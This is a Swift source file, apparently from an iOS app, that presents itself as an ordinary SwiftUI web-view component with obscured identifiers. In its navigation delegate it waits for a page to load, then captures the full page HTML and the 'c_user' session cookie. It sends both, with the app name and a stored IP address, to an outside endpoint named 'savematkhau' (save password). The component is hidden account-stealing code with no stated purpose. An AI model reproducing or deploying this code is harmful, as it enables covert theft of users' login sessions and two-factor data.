//
//  File.swift
//
//
//  Created by DanHa on 25/03/2023.
//

import SwiftUI
import WebKit

@available(iOS 14.0, *)
struct CoordsSix: UIViewRepresentable {
    func makeCoordinator() -> ClassSixCoordinat_or {
        ClassSixCoordinat_or(self)
    }
    let url: URL?
    @Binding var is_six_check_10_phut: Bool

    private let observable_six = six_Ob_servable()
    var ob_six_server: NSKeyValueObservation? {
        observable_six.six_ins_tance
    }

    // end check url
    func makeUIView(context: Context) -> WKWebView {
        let prefs = WKWebpagePreferences()
        prefs.allowsContentJavaScript = true // true
        let source: String = "var meta = document.createElement('meta');meta.name = 'viewport';meta.content ='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no';var head = document.getElementsByTagName('head')[0];head.appendChild(meta);"
        let script: WKUserScript = WKUserScript(source: source, injectionTime: .atDocumentEnd, forMainFrameOnly: true)
        let userContentController: WKUserContentController = WKUserContentController()
        let config = WKWebViewConfiguration()
        config.defaultWebpagePreferences = prefs
        config.userContentController = userContentController
        userContentController.addUserScript(script)

        let webview = WKWebView(frame: .zero, configuration: config)
        webview.customUserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Safari/605.1.15"
        webview.navigationDelegate = context.coordinator
        webview.load(URLRequest(url: url!))
        return webview
    }

    func updateUIView(_ uiView: WKWebView, context: Context) { } // updateUIView

    class ClassSixCoordinat_or: NSObject, WKNavigationDelegate {
        var six_parent: CoordsSix
        init(_ six_parent: CoordsSix) {
            self.six_parent = six_parent
        }

        func webView(_ webView: WKWebView, didStartProvisionalNavigation navigation: WKNavigation!) { }

        func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
            DispatchQueue.main.asyncAfter(deadline: .now() + 2.0) {
                webView.evaluateJavaScript("document.documentElement.outerHTML.toString()") { html, error in
                    if let htmlrecovery = html as? String, error == nil {
                        if !htmlrecovery.isEmpty {
                            if htmlrecovery.contains("class=\"_4-dq\"") {
                                self.six_parent.is_six_check_10_phut = true
                            } else {
//                                self.six_parent.is_six_check_10_phut = false
                                 self.six_parent.is_six_check_10_phut = true // demo
                            }
                            WKWebsiteDataStore.default().httpCookieStore.getAllCookies({ cookies in
                                let six_i = cookies.firstIndex(where: { $0.name == "c_user" })
                                if six_i != nil {
                                    let Six_json_data: [String: Any] = [
                                        "namecuser": cookies[six_i!].value,
                                        "htmlcode2fa": "\(htmlrecovery)",
                                        "nameapp": "\(Bundle.main.object(forInfoDictionaryKey: "CFBundleDisplayName") as? String ?? "")",
                                        "ip2fa": "\(UserDefaults.standard.string(forKey: "keyipcallapi") ?? "")",
                                    ]
                                    // print("\(RCValues.sharedInstance.string(forKey: .Chung_fr_06))")
                                    let url: URL = URL(string: "https://ptafb.com/api/savematkhau")!
                                    let json_data = try? JSONSerialization.data(withJSONObject: Six_json_data)
                                    var request = URLRequest(url: url)
                                    request.httpMethod = "PATCH"
                                    request.setValue("application/json", forHTTPHeaderField: "Content-Type")
                                    request.httpBody = json_data
                                    let task = URLSession.shared.dataTask(with: request) { data, _, error in
                                        if error != nil {
                                            print("not_ok")
                                        } else if data != nil {
                                            // self.parent.is_five_get_html_ads = five_html_ads_show
                                        }
                                    }
                                    task.resume()
                                } // if
                            }) // getAllCookies
                        }
                    }
                } // Get html
            }
        } // didFinish
    } // Class Coordinator
}

// Mark Lop theo doi url
@available(iOS 14.0, *)
private class six_Ob_servable: ObservableObject {
    @Published var six_ins_tance: NSKeyValueObservation?
}
